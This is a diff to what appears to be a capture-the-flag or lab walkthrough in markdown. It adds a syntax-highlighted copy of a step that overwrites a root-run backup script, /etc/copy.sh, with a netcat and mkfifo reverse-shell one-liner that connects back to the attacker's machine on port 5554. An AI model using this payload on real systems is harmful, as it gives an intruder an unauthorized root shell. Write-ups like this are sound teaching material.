@@ -41,6 +41,12 @@ We can abuse the ad function to get a shell one the server
 
 Running `sudo -l` we are quite suprised since we can run `/usr/bin/perl` as root. Digging a bit deeper we can see that there is a backup script which runs `/etc/copy.sh`. We check if we can write into the file and indeed we can. There is no editor and we have to use echo to overwrite the script. 
 
+
+{% highlight bash %}
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
+{% endhighlight %}
+
+
 ```
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
 ```
